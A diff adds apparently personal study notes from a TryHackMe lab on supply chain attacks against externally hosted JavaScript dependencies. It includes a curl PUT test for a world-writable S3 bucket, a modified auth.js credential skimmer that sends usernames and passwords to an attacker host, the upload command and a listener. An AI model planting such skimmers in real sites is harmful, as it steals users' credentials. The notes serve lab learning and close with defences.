@@ -645,6 +645,108 @@ It is one that has been developed by someone in ypur org. Only used by apps in o
 Would an authentication library that we created be considered an internal or external dependency? internal
 Would JQuery be considered an internal or external dependency? external
 #Securing external dependencies
+Are the ones that are HOSTED, MANAGED and UPDATED by EXTERNAL PARTIES.
+###One of the attacks that can be targeted at EXTERNAL DEPENDENCIES is a SUPPLY CHAIN ATTACK.
+#PUBLIC CVES
+There are going to be vulnerabilities in the code they were written by developers for an app. The vulnerabilities will be disclosed publicly
+and they will patch them to rectify that. However, since vulnerabilities are disclosed publicly, they are open to attackers too. It may not be
+easy for those using the apps to react quickly to patching them and unfortunately, these are what attackers will target. They will exploit
+it- looking for systems that still have the vulnerabilities and they exploit.
+It could be dependencies of dependencies sometimes i.e it may not be the SDK that is vulnerable, it may be dependency of the SDK. So you will
+have to update the dependency and update the SDK too. e.g log4j
+Log4j is a java based logging utility- used in almost app developed in java. Several products become vulnerable -up to a 1000
+
+#Supply Chain Attack
+It is the method of attack that is targeted at dependencies of an application instead of targeting the application directly- it is an indirect
+method of attack. Used by attackers knowing that an application may have been securely hardened and cannot be easily compromised, but the
+dependencies used by the application may not be that securely hardened because of budget constraint- so they target the dependencies.
+An Advanced Persistent Group (APG) called MageCart is well known for this. Examples of MageCart Exploits include
+- Compromising BA's payment portal, leading to compromise of customers' credit card and a fine of $230m for BA
+- Compromising credit cards of more than 100k customers by embedding skimmers in various payment portals of applications
+- Compromising more than 10000 AWS S3 buckets by embedding MALWARE in any JavaScript found in the buckets.
+#The compromise of a single dependency can lead to compromise of several applications, since several apps may be using the dependency. So
+it is far more lucrative
+When a dependency is securely hosted, an attacker can exploit it e.g an S3 Bucket with a WORLD-WRITABLE PERMISSIONS configured.
+An attacker could EXPLOIT these permissions to OVERWRITE the HOSTED DEPENDENCY with MALICIOUS CODE.
+#Supply Chain Attack on an INTERNET FACING S3 BUCKET
+- There is an internet-facing s3 bucket that has a Javascript misconfigured world writable permissions on it.
+- If it is internet facing, there should not be any "PUT" command allowed externally. But when you misconfigure permissions in the app
+to allow this, it means anybody externally can access it and gain the control of it to perform malicious acts.
+#THE SIMULATION (LAB FOR THIS EXPLOIT)
+- Need to set up a S3 bucket hostname- run the below command to set up an internet facing s3 bucket i.e you write to hosts in etc to host it
+sudo bash -c "echo 'MACHINE_IP cdn.tryhackme.loc' >> /etc/hosts"
+- You can REFRESH your webpage to see your dependency in the internet-facing s3 bucket
+- To inspect the code of the app. Right Click on "View Source", it will show you DEPENDENCY from cdn.tryhackme.loc
+- Further "inspect the dependency", by opening a link to the dependency, an "auth.js" should be able to be downloaded- see the below:
+//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!
+
+var input = document.getElementById('txtPassword');
+input.addEventListener("keypress", function(event) {    
+	if (event.key == "Enter") {
+		event.preventDefault();
+        	document.getElementById("loginSubmit").click();
+	}
+});
+- Further inspection of the Javascript code library shows that it has a "JS event that monitors the PASSWORD TEXTBOX FOE KEYSTROKES and
+automatically SUBMIT LOGIN FORM if the user presses ENTER". Although the code is NOT SHOWING VULNERABILITY. However take a look at where the
+ dependency is being hosted
+- Further inspect the dependency to the code, by going a step back in the request - run this -"http://cdn.tryhackme.loc:9444/libraries,"
+It shows that it is an s3 bucket hosting dependency- it shows this 
+"<?xml version="1.0" encoding="UTF-8"?><ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">"
+- To test if the team that set this up has misconfigured the S3 bucket to grant the"WORLD WRITABLE PERMISSIONS" is to run the below curl
+command- by trying a PUT REQUEST i.e running "Curl -X PUT"
+curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"
+If you get an "HTTP 200 OK" or able to DOWNLOAD "http://cdn.tryhackme.loc:9444/libraries/test.js. " , it is good for a possible SUPPLY
+CHAIN ATTACK.
+- The supply chain attack could be in different ways to exploit this worl writable permission, but going simple by EMBEDDING A CREDENTIAL
+SKIMMER that will SEND A USER'S CREDENTIAL WHEN THEY CLICK "SUBMIT" i.e modify the code auth.js file 
+- Download the auth.js file
+- Modify it to the below:
+//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!
+
+var input = document.getElementById('txtPassword');
+input.addEventListener("keypress", function(event) {    
+	if (event.key == "Enter") {
+		event.preventDefault();
+        try {
+            const oReq = new XMLHttpRequest();
+            var user = document.getElementById('txtUsername').value;
+            var pass = document.getElementById('txtPassword').value;
+            oReq.open("GET", "http://THM_IP:7070/item?user=" + user + "&pass=" + pass);
+            oReq.send();
+        }
+        catch(err) {
+            console.log(err);
+        }
+		function sleep (time) {
+                    return new Promise((resolve) => setTimeout(resolve, time));
+                }
+                sleep(5000).then(() => {
+    		    document.getElementById("loginSubmit").click();
+                });
+	}
+});
+Note: Ensure the THM_IP is the IP of your THMVPN IP or ATTACKBOX IP
+Once this is done, and the user presses SUBMIT of their credentials, we will get USERNAME and PASSWORD of the target as parameters in the
+
+request through XHR(XMLHTTPRequest)
+The sleep function in the code is to ensure that MALICIOS XHR REQUESTS HAS COMPLETED BEFORE THE PAGE TRANSITION OCCURS, or else a modern
+browser would stop the request from occurring.
+- Upload the auth.js (modified with skimmer) file back into the host to overwrite the original one, by running the below command:
+curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js
+- Spin up a server that will receive the keystrokes from the inetrnet-facing s3 bucket, by running the below command
+python3 -m http.server 7070
+- To test whether the skimmer will work or not, initiate a test on the ineternet-facing s3 bucket website, by entering your credentials
+and submit, you should intercept your password.
+10.10.62.64 - - [10/Aug/2022 10:59:28] "GET /item?user=test&pass=test HTTP/1.1" 404 -
+- Once a user authenticates, we should get the user's keystrokes.
+- Then the user's credentials can be used to authenticate to the website.
+#Defences to limit these attacks
+- Ensure you update and patch dependencies on a regular basis.
+- Dependencies can be copied and hosted internally
+- Use sub resource to prevent tampering with JS libraries from loading by including in the HTML, the "hash of the JS Library". Because
+the modern web browser will VERIFY the hash of JS library and once it does not match, the library will not be loaded
+
 
 
 
